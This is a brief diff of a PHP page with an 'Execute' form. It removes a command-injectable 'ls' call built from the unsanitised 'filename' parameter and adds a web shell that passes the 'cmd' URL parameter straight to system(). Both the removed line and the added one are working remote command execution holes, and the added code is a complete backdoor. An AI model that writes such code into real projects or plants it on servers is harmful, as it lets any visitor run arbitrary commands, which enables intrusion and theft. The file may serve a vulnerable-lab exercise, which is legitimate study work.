@@ -4,6 +4,7 @@
 <input type="SUBMIT" value="Execute">
 </form><pre>
 <?php
-  $cmd = "ls ".$_GET['filename']." 2>&1";
-  system($cmd);
+    if(isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
 ?></pre></body></html>
